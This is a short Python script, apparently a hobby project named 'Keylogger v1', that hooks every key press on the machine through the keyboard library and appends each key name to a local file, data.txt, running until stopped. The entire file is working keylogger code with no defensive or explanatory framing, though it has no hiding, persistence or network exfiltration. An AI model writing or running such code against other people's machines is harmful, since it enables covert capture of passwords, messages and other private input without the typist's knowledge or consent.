#pip install keyboard

import keyboard
import os

os.chdir('D:/Programación/Workspace/projects/Mini-projects/Python/Keylogger v1')

def pressedKey(key):

    with open('data.txt', 'a') as file:

        if key.name == 'space':
            file.write(' ')

        else:
            file.write(key.name)


if __name__ == '__main__':

    keyboard.on_press(pressedKey)
    keyboard.wait()